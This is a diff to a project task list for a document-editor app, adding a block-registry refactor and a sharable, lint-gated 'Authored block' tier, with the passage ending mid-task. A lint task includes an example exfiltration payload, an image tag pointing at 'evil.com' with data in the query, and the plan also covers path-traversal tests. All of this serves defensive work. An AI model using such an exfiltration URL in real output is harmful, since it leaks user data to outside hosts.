@@ -1562,7 +1562,439 @@ Second integration milestone. Fires AFTER M7-spike ships and consultant testing 
 
 ---
 
-## Phase 9 — Deployment & Release
+## Phase 9 — M9a: Block Registry Refactor + 15-Block Migration
+
+Refactor the 15 Standard blocks from the 5-touchpoint pattern (split across `src/editor/nodes/`, `src/renderer/blocks/`, `src/editor/mapping.ts` switch arms, `src/editor/Editor.tsx` arrays) into a single `src/blocks/<name>/` folder per block with a `defineBlock({...})` manifest. Establishes the foundation that M9b (Authored-block tier) builds on. No new user-facing features in M9a — purely an architectural refactor that ships independently of M9b.
+
+Decisions: ADR-0004 (three-tier model), ADR-0006 (threat-model prereqs), ADR-0007 (capability restriction), ADR-0008 (manifest shape + per-block schema/runtime split), ADR-0013 (declarative-data interpretation). Plan: `~/.claude/plans/can-you-lay-out-playful-squid.md`.
+
+Note: T-135 (commit grilling outputs) and T-158a (write ADR-0013) were completed manually before M9a began — see commit `ebe84b9`. Not re-listed as tasks here; first eligible M9a task is T-136.
+
+### T-136 [ ] · Watchdog error boundary (ADR-0006 prereq)
+- **Depends-on:** T-134 (M8 complete)
+- **Reads:** `docs/adr/0006-authored-block-threat-model.md`, `src/block-primitives/RenderWatchdog.tsx`, `src/block-primitives/RenderFailedPlaceholder.tsx`
+- **Outputs:**
+  - `src/block-primitives/RenderWatchdog.tsx` — wrap the watchdog HOC in a React error boundary so a block whose render throws degrades to `RenderFailedPlaceholder` instead of crashing the editor. Extend `RenderFailedReason` with a `"render-threw"` variant. Today only `"render-budget-exceeded"` is handled.
+  - `src/block-primitives/RenderFailedPlaceholder.tsx` — handle the new reason variant.
+  - `tests/block-primitives/render-watchdog.test.tsx` — add cases for a block that throws synchronously on render and one that throws on a subsequent render after passing initially.
+- **Acceptance:** a block that throws renders `RenderFailedPlaceholder` with the throw's message; the editor stays mounted; existing 50ms-budget test still passes.
+- **est.** 1h
+
+### T-137 [ ] · URL-attribute lint rule (ADR-0006 prereq)
+- **Depends-on:** T-134
+- **Reads:** `docs/adr/0006-authored-block-threat-model.md`, `src/setup/lint-generated.ts`
+- **Outputs:**
+  - `src/setup/lint-generated.ts` — new rule `url-attribute-literal`: reject any literal `http://` or `https://` string appearing as the value of `src`, `href`, `action`, `srcset`, `formaction`, `poster`, `data`, `cite` JSX attributes, or inside a CSS `url(...)` literal in a `style` prop. Brand-token references and `assets/` paths are not literals so they're unaffected.
+  - `tests/setup/lint-generated.test.ts` — fixtures covering each attribute + the CSS `url()` case + negative fixtures (brand tokens, relative `assets/`).
+- **Acceptance:** the new rule catches `<img src="https://evil.com/?data=...">` and equivalents; brand-token-derived URLs pass; all existing rules still pass.
+- **est.** 1h
+
+### T-138 [ ] · Reference pattern refresh
+- **Depends-on:** T-139 (needs the `defineBlock` API to exist before patterns can demonstrate it)
+- **Reads:** `docs/adr/0008-block-registry-manifest-shape.md`, `reference/callout/`, `reference/chart/`, `reference/mapping/`
+- **Outputs:**
+  - `reference/callout/` — rewrite to the new single-folder `defineBlock({...})` shape: `schema.ts` (pure) + `index.ts` (runtime) + `README.md` (canonical simple-block pattern).
+  - `reference/chart/` — rewrite to the new shape, keeping the atom-node + side-panel pattern (still imperative `defineBlock`, per ADR-0007 restriction).
+  - `reference/mapping/` — mark deprecated; README points readers at the registry-iteration pattern that replaces the per-block orchestrator switch.
+- **Acceptance:** all three reference patterns reflect the new shape; the `next-task` loop's future block work has a correct copy-source.
+- **est.** 3h
+
+### T-139 [ ] · Registry API + per-block schema/runtime module split (pure schema, runtime separate)
+- **Depends-on:** T-136, T-137 (prereqs landed first)
+- **Reads:** `docs/adr/0008-block-registry-manifest-shape.md`, `docs/adr/0013-authored-blocks-are-declarative-data.md`, `src/schema/blocks/callout.ts`, `src/editor/nodes/CalloutNode.tsx`, `src/renderer/blocks/Callout.tsx`
+- **Outputs:**
+  - `src/blocks/schema-registry.ts` (NEW) — pure registry. Imports only `*/schema.ts` files. Per block: `{ schemaName, schema (Zod), allowedAttrs, paletteLabel }`. No React, no TipTap.
+  - `src/blocks/runtime-registry.ts` (NEW) — full runtime registry. Imports `*/index.ts` files. Joins runtime fields with schema-registry by `schemaName` at boot.
+  - `src/blocks/defineBlock.ts` (NEW) — the `defineBlock({...})` factory. Takes a fully-constructed TipTap `Node.create({...})`, a React node view, a React renderer, `toPm`/`fromPm`, `allowedAttrs`, and palette metadata. Returns a typed registry record split internally between schema-only and runtime fields.
+  - `tests/blocks/schema-purity.test.ts` (NEW) — static-import test: walks `src/schema/**` and `src/blocks/*/schema.ts`; fails CI if any of them transitively imports `react`, `@tiptap/*`, or anything under `src/renderer/`.
+- **Acceptance:** the registries are typed and empty; the factory compiles; the schema-purity test passes on the (still-empty) per-block schema folders.
+- **est.** 4h
+
+### T-158a [x] · ADR-0013: Authored blocks are declarative data, not executable code
+Already done in commit `ebe84b9` (pre-M9a). Listed here for protocol/audit completeness; placement in the dependency chain is between T-138 and T-139.
+- **Outputs:** `docs/adr/0013-authored-blocks-are-declarative-data.md`
+- **Acceptance:** ADR-0013 exists, references ADR-0005/0006/0008 correctly, formalises the "parsed as object literal, never executed" contract.
+
+### T-140 [ ] · Registry loaders (schema + runtime, both static for M9a)
+- **Depends-on:** T-139
+- **Reads:** `docs/adr/0008-block-registry-manifest-shape.md`
+- **Outputs:**
+  - `src/blocks/schema-registry.ts` — extend with `loadAllSchemas()` that statically imports the 15 Standard blocks' `schema.ts` files (paths are stubs until T-141 scaffolds the folders).
+  - `src/blocks/runtime-registry.ts` — extend with `loadAllBlocks()` that statically imports `*/index.ts`. Joins with schema-registry entries by `schemaName`. Dynamic folder-scan code path for `generated-blocks/active/` is stubbed but not wired (M9b T-164).
+- **Acceptance:** both loaders compile and return empty lists (until T-141 creates the folders); schema-purity test from T-139 still passes.
+- **est.** 2h
+
+### T-141 [ ] · Folder layout scaffolding (legacy-wrapper approach, schema + runtime per block)
+- **Depends-on:** T-140
+- **Reads:** `docs/adr/0008-block-registry-manifest-shape.md`
+- **Outputs:**
+  - `src/blocks/<name>/` × 15 (NEW folders, one per Standard block) — each containing:
+    - `schema.ts` — re-exports the existing `src/schema/blocks/<name>.ts` content unchanged. Pure.
+    - `index.ts` — imports `./schema.ts` plus the existing legacy `src/editor/nodes/<Name>Node.tsx` + `src/renderer/blocks/<Name>.tsx`, wraps them in a `defineBlock({...})` manifest, default-exports.
+- **Acceptance:** both registries populate via the wrappers; the schema-purity test passes; `npm run build && npm test` green; no behaviour change in the running app.
+- **est.** 3h
+
+### T-141a [ ] · Example brand theme: professional consulting style + structural HTML snapshot baselines
+- **Depends-on:** T-136, T-137
+- **Reads:** `brand.example.yaml`, `reference/primitives/BrandProvider.tsx`, `src/brand-tokens/`
+- **Outputs:**
+  - `brand.example.yaml` — professional-consulting-style theme: Headings Georgia 22 (scale relatively), body Arial 12, primary dark blue (~`#001A70`), neutral grey scale, chart palette in blue-family (qualitative: deep navy → mid blue → light blue → desaturated; sequential: dark-blue → light-blue ramp).
+  - `tests/renderer/<name>.snapshot.test.ts` × 15 — Vitest HTML snapshot of each Standard block rendered under the new brand tokens. These become the structural baseline T-142+ compare against.
+  - (Optional) `docs/visual-references/` — human-reference screenshots; not CI gates.
+- **Naming constraint:** committed files must NOT name the consultancy this theme is modelled after. Use neutral descriptions ("professional consulting style", "corporate consulting example", "default example brand"). Applies to `brand.example.yaml`, READMEs, code comments, commit messages — everything. Provenance is communicated out-of-band only.
+- **Acceptance:** structural HTML snapshots pass for all 15 Standard blocks under the new theme; `npm test` green. Manual visual check (open dev surface, eyeball fixtures) recommended but not a CI gate.
+- **Note:** must be `[x]` before T-141 begins so the visual baseline is settled before any registry refactoring. Runs in parallel with T-138.
+- **est.** 4h
+
+### T-141b [ ] · Make `mapping.ts` registry-aware (hybrid)
+- **Depends-on:** T-141
+- **Reads:** `src/editor/mapping.ts`
+- **Outputs:**
+  - `src/editor/mapping.ts` — consult the runtime registry first for each block type's `toPm`/`fromPm`; fall back to the existing per-block switch arms for blocks not yet folded into the registry's manifest. After T-141b, removing a switch arm during a per-block migration (T-142+) is safe — the registry covers it. T-157a removes the fallback path entirely once all 15 are migrated.
+- **Acceptance:** all existing DocModel ⇄ ProseMirror losslessness tests still pass; the registry-first path is exercised (test that proves mapping.ts now reads from the registry when an entry exists).
+- **est.** 2h
+
+### T-141c [ ] · Bridge: refactor M8's generated-blocks loader onto the runtime registry
+- **Depends-on:** T-141, T-132
+- **Reads:** `src/setup/load-generated-blocks.ts`, `src/contexts/GeneratedBlocksContext.tsx` (created by T-132), `src/blocks/runtime-registry.ts`
+- **Outputs:**
+  - `src/blocks/runtime-registry.ts` — implement the dynamic folder-scan code path (still Brand-only in M9a; Authored joins it in M9b T-164). Reads `generated-blocks/active/`, parses + lints each file, joins resulting entries into the registry.
+  - `src/App.tsx` — replace the M8 `loadGeneratedBlocks` + `GeneratedBlocksContext` wiring with a single registry initialisation call.
+  - `src/ui/views/DocumentView.tsx` — BlockPalette now consumes its Brand-block list from the runtime-registry rather than from `GeneratedBlocksContext`.
+  - `src/contexts/GeneratedBlocksContext.tsx` — either thinned to a shim over the registry or deleted, depending on other consumers (audit during the task).
+- **Acceptance:** one loader, one registry; M8 acceptance test (T-134) still passes; Brand blocks from `generated-blocks/active/` appear in the BlockPalette.
+- **Note:** M9a gate before M9b — NOT a blocker for T-142–T-156. Per-block Standard migration can proceed in parallel since Standard blocks load statically.
+- **est.** 3h
+
+### T-142 [ ] · Migrate Divider block to registry
+- **Depends-on:** T-141, T-141b, T-141a
+- **Reads:** `src/schema/blocks/divider.ts`, `src/editor/nodes/DividerNode.tsx`, `src/renderer/blocks/Divider.tsx`, `docs/adr/0008-block-registry-manifest-shape.md`, `tests/renderer/divider.snapshot.test.ts` (from T-141a)
+- **Outputs:**
+  - `src/blocks/divider/schema.ts` — fold the content of `src/schema/blocks/divider.ts` here (self-contained, not a re-export).
+  - `src/blocks/divider/index.ts` — fold `editor/nodes/DividerNode.tsx` + `renderer/blocks/Divider.tsx` into the `defineBlock({...})` manifest. Import schema from `./schema.ts`.
+  - Delete: `src/schema/blocks/divider.ts`, `src/editor/nodes/DividerNode.tsx`, `src/renderer/blocks/Divider.tsx`.
+  - `src/editor/mapping.ts` — remove the now-orphan dispatch arm for `divider`.
+  - Update any tests/fixtures that imported from the old paths.
+- **Acceptance:** `tsc --noEmit && npm test` green; the structural HTML snapshot for Divider matches the post-T-141a baseline; DocModel ⇄ ProseMirror losslessness test passes on a Divider-containing fixture.
+- **est.** 1h
+
+### T-143 [ ] · Migrate Heading block to registry
+- **Depends-on:** T-142 (validate the pattern on Divider first)
+- **Reads:** as T-142, substituting Heading paths
+- **Outputs:** as T-142, substituting Heading paths
+- **Acceptance:** as T-142
+- **est.** 1h
+
+### T-144 [ ] · Migrate Prose block to registry
+- **Depends-on:** T-143
+- **Reads/Outputs/Acceptance:** as T-142 for Prose
+- **est.** 1h
+
+### T-145 [ ] · Migrate Callout block to registry
+- **Depends-on:** T-144
+- **Reads/Outputs/Acceptance:** as T-142 for Callout (rich-text-container variant)
+- **est.** 1.5h
+
+### T-146 [ ] · Migrate BulletList block to registry
+- **Depends-on:** T-145
+- **Reads/Outputs/Acceptance:** as T-142 for BulletList
+- **est.** 1h
+
+### T-147 [ ] · Migrate NumberedList block to registry
+- **Depends-on:** T-146
+- **Reads/Outputs/Acceptance:** as T-142 for NumberedList
+- **est.** 1h
+
+### T-148 [ ] · Migrate Image block to registry
+- **Depends-on:** T-147
+- **Reads/Outputs/Acceptance:** as T-142 for Image
+- **est.** 1h
+
+### T-149 [ ] · Migrate Diagram block to registry
+- **Depends-on:** T-148
+- **Reads/Outputs/Acceptance:** as T-142 for Diagram (Mermaid-backed)
+- **est.** 1.5h
+
+### T-150 [ ] · Migrate Timeline block to registry
+- **Depends-on:** T-149
+- **Reads/Outputs/Acceptance:** as T-142 for Timeline
+- **est.** 1.5h
+
+### T-151 [ ] · Migrate Roadmap block to registry
+- **Depends-on:** T-150
+- **Reads/Outputs/Acceptance:** as T-142 for Roadmap
+- **est.** 1.5h
+
+### T-152 [ ] · Migrate RiskMatrix block to registry
+- **Depends-on:** T-151
+- **Reads/Outputs/Acceptance:** as T-142 for RiskMatrix
+- **est.** 1.5h
+
+### T-153 [ ] · Migrate Team block to registry
+- **Depends-on:** T-152
+- **Reads/Outputs/Acceptance:** as T-142 for Team
+- **est.** 1.5h
+
+### T-154 [ ] · Migrate KpiCards block to registry (atom-node-with-grid-panel pattern)
+- **Depends-on:** T-153 (build up to the atom-node patterns)
+- **Reads:** as T-142, plus any side-panel files used by KpiCards
+- **Outputs:** as T-142, with `src/blocks/kpi-cards/` co-locating any side-panel component
+- **Acceptance:** as T-142; KpiCards atom-node round-trip + side-panel edit-flow test still passes
+- **est.** 2h
+
+### T-155 [ ] · Migrate Table block to registry (atom-node-with-column-schema pattern)
+- **Depends-on:** T-154
+- **Reads/Outputs/Acceptance:** as T-154 for Table
+- **est.** 2h
+
+### T-156 [ ] · Migrate Chart block to registry (atom-node-with-side-panel + ECharts SSR)
+- **Depends-on:** T-155
+- **Reads:** as T-142, plus `src/editor/panels/ChartDataPanel.tsx`
+- **Outputs:** `src/blocks/chart/` co-locating `ChartDataPanel.tsx`; the `getEChartsOption` SSR helper stays accessible to the renderer + PDF export path
+- **Acceptance:** as T-142; ECharts SSR test still passes; chart data-panel editing round-trips
+- **est.** 2h
+
+### T-157a [ ] · Editor-side registry wire-through (delete mapping.ts switches, derive Editor.tsx from registry)
+- **Depends-on:** T-156 (all 15 blocks migrated)
+- **Reads:** `src/editor/mapping.ts`, `src/editor/Editor.tsx`
+- **Outputs:**
+  - `src/editor/mapping.ts` — replace the two ~30-case switch statements with registry iteration. Delete the hybrid fallback added in T-141b — all blocks are in the registry now.
+  - `src/editor/Editor.tsx` — derive `blockExtensions`, `ALLOWED_EDITOR_NODE_NAMES`, `ALLOWED_EDITOR_MARK_NAMES`, `allowedAttrsForNode` from the registry. The closed-content security boundary remains; it just sources its allowed sets from the registry.
+- **Acceptance:** all losslessness + editor tests pass; no hand-maintained per-block switches remain in either file.
+- **est.** 3h
+
+### T-157b [ ] · Renderer-side registry wire-through (DocumentRenderer + DeckRenderer iterate registry)
+- **Depends-on:** T-156 (parallel with T-157a)
+- **Reads:** `src/renderer/DocumentRenderer.tsx`, `src/renderer/DeckRenderer.tsx`
+- **Outputs:**
+  - `src/renderer/DocumentRenderer.tsx` — iterate the runtime registry and use each block's `renderer` function. Delete any per-block render switch.
+  - `src/renderer/DeckRenderer.tsx` — same treatment if it carries a parallel switch.
+- **Acceptance:** all renderer tests (HTML + PDF export) pass; structural HTML snapshots from T-141a still match.
+- **est.** 2h
+
+### T-157c [ ] · Schema-side registry wire-through (build discriminated union from schema-registry)
+- **Depends-on:** T-156 (parallel with T-157a/b)
+- **Reads:** `src/schema/blocks/index.ts`
+- **Outputs:**
+  - `src/schema/blocks/index.ts` — discriminated union built from the schema-registry rather than from a hand-maintained list. Standard blocks: static union (preserves Zod type-narrowing). Brand/Authored blocks: open at the type level, validated against the live schema-registry's `schemaName` list at parse time. Original `src/schema/blocks/<name>.ts` files were moved/deleted in T-142–T-156; `src/schema/blocks/index.ts` becomes a thin re-export from `src/blocks/schema-registry.ts` (or is replaced entirely — audit downstream consumers).
+- **Acceptance:** all schema-validation tests pass; the schema-purity test from T-139 still passes (`src/schema/**` + `src/blocks/*/schema.ts` do not transitively import React/TipTap/`src/renderer/`).
+- **est.** 2h
+
+### T-158 [ ] · Memo §3 + cross-reference cleanup
+- **Depends-on:** T-135 (ADRs committed) — can run in parallel with the migration
+- **Reads:** `docs/DOCUMENT_SYSTEM_ARCHITECTURE.md`, `docs/BUILD_BRIEF.md`, `docs/BLOCK_IMPLEMENTATION_GUIDE.md`, `docs/SETUP_PIPELINE.md`, `docs/setup-runbook.md`, `blocks.catalogue.yaml`
+- **Outputs:**
+  - `docs/DOCUMENT_SYSTEM_ARCHITECTURE.md` lines 152–186 — "two-tier" → "three-tier", remove "Capped at 10 per setup pass", soften "closed library per consultancy instance" to "closed at any given moment; evolves via Authored-block sharing." Reference ADR-0004.
+  - `docs/DOCUMENT_SYSTEM_ARCHITECTURE.md` lines 37–38 — clarify "consultancy-specific blocks" with ADR-0004 pointer.
+  - `docs/BUILD_BRIEF.md` line 223 — verify the CONTEXT.md reference is correct (CONTEXT.md exists at repo root as of commit `ebe84b9`).
+  - `docs/BLOCK_IMPLEMENTATION_GUIDE.md` — refresh for the new `defineBlock` pattern (registry-based instead of 4-file split). Confirm `blocks.catalogue.yaml` references match the existing file at repo root (the file IS present at 26KB).
+  - Audit whether `blocks.catalogue.yaml` is still serving its original purpose or has been superseded by the schema-registry; if superseded, mark it as a setup-time-only artifact in its own header.
+  - `docs/SETUP_PIPELINE.md` + `docs/setup-runbook.md` — update "Tier 1 block" mentions to use the new Standard/Brand vocabulary.
+  - Grep TASKS.md for "generated block" and normalise to Standard/Brand/Authored where appropriate.
+- **Acceptance:** memo prose no longer contradicts ADR-0004; vocabulary across docs is consistent with CONTEXT.md.
+- **est.** 2h
+
+**M9a acceptance gate:** all 15 Standard blocks live under `src/blocks/<name>/`; nothing remains in `src/editor/nodes/` or `src/renderer/blocks/`; mapping.ts / Editor.tsx / DocumentRenderer.tsx / src/schema/blocks/index.ts all derive block-type information from the registry; structural HTML snapshots green; full test suite green; brand example theme + memo cross-references landed.
+
+---
+
+## Phase 10 — M9b: Authored-Block Tier (Tier 3)
+
+Ship the consultant-generated, peer-to-peer-shareable block tier on top of M9a's registry. Three sub-areas: declarative authoring API + AST-to-data extractor, transport (manifest header + drag-onto-window install + Rust-sidecar lint-at-receive + scaffold-mismatch regen), lifecycle (identity + replacement + soft archive + IPC commands), plus authoring UX and LLM provisioning.
+
+Decisions: ADR-0004, ADR-0005, ADR-0006, ADR-0007, ADR-0009 (identity), ADR-0010 (soft archive), ADR-0011 (authoring UX), ADR-0012 (LLM provisioning), ADR-0013 (declarative data). Plan: `~/.claude/plans/can-you-lay-out-playful-squid.md`.
+
+### T-159 [ ] · `defineAuthoredBlock` declarative API design
+- **Depends-on:** T-158 (M9a complete)
+- **Reads:** `docs/adr/0007-authored-block-capability-restriction.md`, `docs/adr/0008-block-registry-manifest-shape.md`, `docs/adr/0013-authored-blocks-are-declarative-data.md`
+- **Outputs:**
+  - `src/blocks/authored/defineAuthoredBlock.ts` (NEW) — types + factory signature. Manifest fields: `slug` (kebab-case), `title`, `attrs` as a typed list (string field, enum picker, number, bool, repeated-item list), `content: "rich-text" | "none"`, declarative renderer template (constrained tree of layout primitives, NOT JSX with arbitrary expressions). All fields must be representable as a pure JSON-equivalent value (every field serialisable, no functions). Type system enforces ADR-0007's capability restriction.
+  - `reference/authored-block/` (NEW) — canonical Authored-block scaffold + README + tests. Becomes the codegen target.
+- **Acceptance:** the API compiles; the type system rejects atom-node/side-panel/echarts patterns at compile time.
+- **est.** 5h
+
+### T-160 [ ] · `defineAuthoredBlock` runtime implementation (built-in expander code)
+- **Depends-on:** T-159
+- **Reads:** `docs/adr/0013-authored-blocks-are-declarative-data.md`
+- **Outputs:**
+  - `src/blocks/authored/defineAuthoredBlock.ts` — implement the runtime: declarative attrs widgets, renderer-template expansion (built-in app-bundled code consuming the declarative tree from the manifest), auto-generated nodeView (form-based, no custom code), auto-generated toPm/fromPm. The manifest is data — this file is the only code that turns it into a TipTap node + view + renderer.
+  - Authored-block-specific lint rules per ADR-0013: file must default-export exactly one `defineAuthoredBlock({...})` call; no top-level statements outside that; no expressions inside the literal that aren't statically evaluable; no imports outside the narrow Authored allow-list.
+- **Acceptance:** a sample Authored-block manifest passes through the runtime and renders a working block in the editor.
+- **est.** 8h
+
+### T-161 [ ] · Manifest header parser + serializer
+- **Depends-on:** T-159
+- **Reads:** `docs/adr/0005-authored-block-transport-format.md`
+- **Outputs:**
+  - `src/blocks/authored/manifest-header.ts` (NEW) — parses + serializes the strict header comment block at the top of every Authored `.tsx`. Header carries: scaffold version, generator model name + version, original prompt, sender email, timestamp.
+  - Round-trip test: parse → serialize → identical bytes.
+- **Acceptance:** round-trip test passes; malformed headers produce typed errors.
+- **est.** 3h
+
+### T-162 [ ] · Identity scheme validator (`{sender}:{slug}` block types)
+- **Depends-on:** T-161
+- **Reads:** `docs/adr/0009-authored-block-identity-and-replacement.md`, `src/schema/blocks/index.ts`
+- **Outputs:**
+  - Extend the DocModel schema's block-type string validator to accept `{sender-email}:{slug}` format alongside identifier-shaped Standard/Brand types.
+  - Lint check (added to T-160's Authored rules): slug is kebab-case, sender is a syntactically valid email.
+- **Acceptance:** Authored type strings validate; invalid identities are rejected at parse time + as lint failures.
+- **est.** 2h
+
+### T-163 [ ] · Lint-at-receive (Rust sidecar via Tauri IPC) + AST-to-data extractor
+- **Depends-on:** T-136, T-137 (lint rules), T-161, T-162; **also gated on swc_ecma_parser ratification** — see Note below
+- **Reads:** `docs/adr/0006-authored-block-threat-model.md`, `docs/adr/0013-authored-blocks-are-declarative-data.md`, `src/setup/lint-generated.ts` (rule set to mirror)
+- **Outputs:**
+  - `src-tauri/Cargo.toml` — add `swc_ecma_parser` dependency (Apache-2.0). **First sub-step:** confirm with the project owner that the new Rust runtime dependency is acceptable under R10. If unratified, mark this task `[?]` and halt.
+  - `src-tauri/src/lint/` (NEW Rust module) — parser + lint + extractor. Mirrors the rule set in `src/setup/lint-generated.ts` plus the Authored-specific rules from T-160 plus the URL-attribute rule from T-137.
+  - New IPC command `lint_authored_block(source: string) → LintResult { ok, violations, extracted_manifest? }`.
+  - `src/ipc/authored-block.ts` (NEW) — TypeScript client for the IPC command.
+  - `tests/blocks/authored/fixtures/` (NEW) — shared fixture set run against BOTH the TypeScript setup-time lint and the Rust runtime lint. CI fails if the two produce different pass/fail or violation lists. The bar is "both lints agree," not "both lints exist."
+- **Acceptance:** the CI shared-fixture test passes — every fixture produces identical pass/fail + violation list (rule name, line, column) from both lints.
+- **Note:** **Rust runtime dependency requires explicit human ratification** before this task can complete. The loop should treat unratified state as `[?]`, not auto-proceed.
+- **est.** 8h (Rust port of the rule set is the bulk)
+
+### T-164 [ ] · Drag-onto-window install + "Import block" menu item
+- **Depends-on:** T-163
+- **Reads:** `docs/adr/0005-authored-block-transport-format.md`
+- **Outputs:**
+  - Tauri webview drag-drop handler — on file drop, trigger the receive pipeline (parse header → lint via T-163's IPC → if pass write to `generated-blocks/active/`, if fail to `generated-blocks/quarantine/`).
+  - File menu item "Import block…" opens a native file picker, converges on the same receive handler.
+  - Runtime-registry's dynamic loader (stubbed in T-140, partially implemented in T-141c for Brand) now also scans `generated-blocks/active/` for Authored manifests.
+- **Acceptance:** dragging a valid Authored `.tsx` activates the block in the BlockPalette; dragging an invalid one quarantines with a visible reason.
+- **est.** 4h
+
+### T-165 [ ] · Quarantine state + UI
+- **Depends-on:** T-164
+- **Reads:** `docs/adr/0005-authored-block-transport-format.md`
+- **Outputs:**
+  - `generated-blocks/quarantine/` (NEW folder).
+  - UI surface (banner in the library view or a Settings tab) listing quarantined blocks with their failure reasons + originating sender. Per-block actions: "Delete", "Retry import" (for soft failures).
+- **Acceptance:** quarantined blocks are visible; reasons are human-readable; actions work.
+- **est.** 3h
+
+### T-166 [ ] · Scaffold-mismatch detection + "Regenerate against current scaffold" UX
+- **Depends-on:** T-165, T-175 (needs the LLM category provisioned)
+- **Reads:** `docs/adr/0005-authored-block-transport-format.md`
+- **Outputs:**
+  - On receive, compare the block's scaffold version (from manifest header) to the app's current scaffold version. Mismatch → quarantine with a specific reason + "Regenerate against current scaffold" button.
+  - Button fires the LLM with the original prompt + current scaffold → re-runs lint → activates or re-quarantines.
+- **Acceptance:** a block authored against a prior scaffold quarantines on receive; clicking Regenerate produces a new block that lint-passes against the current scaffold and activates.
+- **est.** 4h
+
+### T-167 [ ] · Soft archive IPC commands + capability ACL update (verify against plugin source per AGENTS.md review playbook)
+- **Depends-on:** T-164
+- **Reads:** `docs/adr/0010-authored-block-soft-archive-on-removal.md`, AGENTS.md "Review playbook" section, `src-tauri/tauri.conf.json`, existing capability JSON
+- **Outputs:**
+  - `src-tauri/capabilities/*.json` — add the three new commands to the app permissions.
+  - `src-tauri/tauri.conf.json` `assetProtocol.scope` — include `generated-blocks/archived/**` alongside `active/**` and `pending/**`.
+  - **Verify** against `~/.cargo/registry/src/*tauri-plugin-fs*/src/scope.rs` that the regex/glob shape we declare is what the plugin actually enforces (M7.5 drift `[drift-2026-05-26f]` precedent — plugin scope is a separate enforcement layer).
+  - Three new Rust IPC handlers: `archive_authored_block(name)`, `restore_authored_block(name)`, `permanently_delete_authored_block(name)`. Each is a single file-system operation under `generated-blocks/`.
+  - `src/ipc/authored-block.ts` — extend with TS clients for the three commands.
+  - `docs/TAURI_IPC.md` — document the three new commands, signatures, and the updated scope.
+  - Regression test that the `assetProtocol.scope` regex (with Tauri's `^...$` wrap) matches expected archived paths but rejects path-traversal attempts.
+- **Acceptance:** the three commands work; the path-scope regression test passes; the regex-wrap test mirrors the actual plugin behaviour.
+- **est.** 4h
+
+### T-168 [ ] · `generated-blocks/archived/` folder + `RemovedBlockPlaceholder`
+- **Depends-on:** T-167, T-141c
+- **Reads:** `docs/adr/0010-authored-block-soft-archive-on-removal.md`
+- **Outputs:**
+  - Create `generated-blocks/archived/`.
+  - Runtime-registry loader scans both `active/` and `archived/`; both feed the registry; only `active/` feeds the BlockPalette filter (T-169).
+  - `src/blocks/RemovedBlockPlaceholder.tsx` (NEW) — shown when a document references a block type that's not in the registry at all (permanently-deleted case). Shows the missing block's type string (and sender from the prefix).
+- **Acceptance:** archived blocks still render in existing documents; permanently-deleted blocks render the placeholder; the BlockPalette never lists archived blocks.
+- **est.** 2h
+
+### T-169 [ ] · BlockPalette filter (active-only) + Authored-block manager view
+- **Depends-on:** T-168
+- **Reads:** `docs/adr/0010-authored-block-soft-archive-on-removal.md`
+- **Outputs:**
+  - BlockPalette filters registry entries by folder origin — shows only `active/` Authored blocks alongside Standard + Brand blocks.
+  - Small "Manage Authored blocks" panel (settings or library sidebar) lists active + archived blocks with per-block actions (archive / restore / permanently-delete via T-167's IPC). Removal warning on permanent delete uses an in-memory open-docs scan only (library-wide scan deferred per ADR-0010).
+- **Acceptance:** the management UI works; removal warnings show open-doc counts.
+- **est.** 3h
+
+### T-170 [ ] · Replacement logic (same-sender v2 replaces v1 in whichever folder v1 was in)
+- **Depends-on:** T-168
+- **Reads:** `docs/adr/0009-authored-block-identity-and-replacement.md`
+- **Outputs:**
+  - Receive pipeline: if a block with the same `{sender}:{slug}` already exists, replace it in-place (active stays active, archived stays archived). Watchdog catches v2-render crashes.
+  - Tests covering both folders and the "different sender, same slug" coexistence case.
+- **Acceptance:** v2 from the same sender replaces v1; v2 from a different sender coexists; both edge cases tested.
+- **est.** 2h
+
+### T-171 [ ] · In-document "Create new Authored block" trigger
+- **Depends-on:** T-169
+- **Reads:** `docs/adr/0011-authored-block-generation-ux.md`
+- **Outputs:**
+  - BlockPalette "Create new…" button at the bottom opens the authoring UI (T-172).
+  - Trigger captures the current document context (in-memory DocModel) for use by the generation prompt.
+- **Acceptance:** the button opens the authoring UI; the document context is correctly threaded through.
+- **est.** 2h
+
+### T-172 [ ] · Preview-first hybrid authoring UI (chat + structured fields, live preview)
+- **Depends-on:** T-171
+- **Reads:** `docs/adr/0011-authored-block-generation-ux.md`
+- **Outputs:**
+  - Modal/panel with: description input, structured manifest-fields editor, live preview pane (rendered inside the watchdog from the first frame). Iteration via chat-style follow-ups or by editing the structured fields directly — both surfaces stay in sync.
+- **Acceptance:** the consultant can describe a block, see a draft preview, refine it via either surface; preview crashes are caught by the watchdog.
+- **est.** 8h
+
+### T-173 [ ] · Authored-block generation pipeline (LLM call + shared receive pipeline)
+- **Depends-on:** T-172, T-175
+- **Reads:** `docs/adr/0011-authored-block-generation-ux.md`, D-13 (prompt-caching strategy)
+- **Outputs:**
+  - LLM call with document context (surrounding blocks + brand tokens + tone). Uses the new `authored-block-generation` category (ADR-0012). Same prompt-caching strategy as D-13.
+  - Output goes through the SAME lint + watchdog gate as a received block (T-163) — single pipeline. Initial result populates T-172's preview UI; iteration calls refine the in-progress file.
+- **Acceptance:** generation produces a valid `defineAuthoredBlock({...})` file that passes T-163's gate; iteration messages refine without re-running the full generation prompt unnecessarily.
+- **est.** 6h
+
+### T-174 [ ] · Share flow (sender stamp + OS share-sheet attachment)
+- **Depends-on:** T-173
+- **Reads:** `docs/adr/0005-authored-block-transport-format.md`
+- **Outputs:**
+  - "Share this block" action stamps the sender email into the manifest header (until then, the type string uses a `local:` prefix so identity is stable across local edits but not yet shareable).
+  - Produces the file as an email attachment via the OS share-sheet (Tauri capability work). Fallback: copy file path to clipboard.
+- **Acceptance:** shared blocks can be attached to email via the OS share sheet; receiving the attachment + dragging onto another instance activates it.
+- **est.** 3h
+
+### T-175 [ ] · LLM provisioning — `authored-block-generation` frontier-key category
+- **Depends-on:** T-135 (ADR-0012 committed) — independent of registry refactor work
+- **Reads:** `docs/adr/0012-authored-block-codegen-uses-frontier-model.md`, D-11, D-22 (install pipeline)
+- **Outputs:**
+  - Extend the install pipeline to provision a third LLM key category — the frontier model with code-generation access. Confirms key validity at install time; produces a clear error if the key lacks code-gen access. Every install gets all three keys, not just author-mode installs (recipients need frontier access for scaffold-mismatch regen — T-166).
+- **Acceptance:** install flow provisions and validates the frontier key; missing/invalid key produces a clear actionable error.
+- **est.** 3h
+
+### T-176 [ ] · Cost ledger — new `authored-block-generation` category
+- **Depends-on:** T-175
+- **Reads:** `docs/DECISIONS.md` D-34 amendment
+- **Outputs:**
